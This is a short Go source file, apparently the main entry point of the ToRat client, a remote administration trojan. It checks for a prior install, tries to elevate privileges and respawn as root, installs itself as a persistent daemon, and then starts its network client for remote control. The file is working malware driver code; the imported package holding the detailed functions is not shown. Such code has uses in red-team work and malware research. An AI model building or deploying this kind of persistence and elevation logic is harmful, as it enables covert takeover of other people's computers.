package main

import (
	"os"

	client "github.com/lu4p/ToRat/torat_client"
)

func main() {
	func() {
		if client.CheckExistingInstall() {
			return // Found Existing Install
		}
		if client.CheckElevate() {
			client.SetupDaemon() // Setup as root
			return
		}
		if client.Elevate() == nil {
			// elevate sucessful, another instance has been spawned no need to keep this running
			os.Exit(0)
		}
		client.SetupDaemon() // Setup as user
	}()

	client.NetClient()
}
